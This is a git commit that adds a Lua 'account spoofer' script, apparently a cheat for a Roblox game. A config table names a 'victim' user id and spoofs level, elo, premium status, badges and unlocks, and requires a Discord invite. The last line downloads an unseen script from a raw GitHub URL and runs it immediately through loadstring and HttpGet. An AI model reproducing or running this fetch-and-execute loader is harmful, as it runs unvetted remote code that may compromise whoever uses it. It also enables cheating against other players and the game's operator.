379b606f3209f8e3c0018b61b100f09b0da48dc1
1xse <korekpumpkin@gmail.com>
2026-04-02 03:05:47 +1400

    account spoofer.lua

---
+++ account spoofer.lua
@@ -0,0 +1,15 @@
+getgenv().Config = {
+    victim = 1,             -- victim userid only
+    helper = "",                   -- helper username (keep this empty if you want to spoof yourself)
+    level = 1,                    -- level override
+    streak = 1,                   -- winstreak override (0 = disabled)
+    elo = 1,                       -- elo override (0 = disabled)
+    keys = 1,                     -- keys override (0 = disabled)
+    premium = true,               -- spoof premium
+    verified = true,              -- spoof verified badge
+    unlockall = true,              -- unlock all
+    platform = "VR",               -- DESKTOP / MOBILE / CONSOLE / VR
+    join = "discord.gg/rivalscomp" -- remove this and the script won't work
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
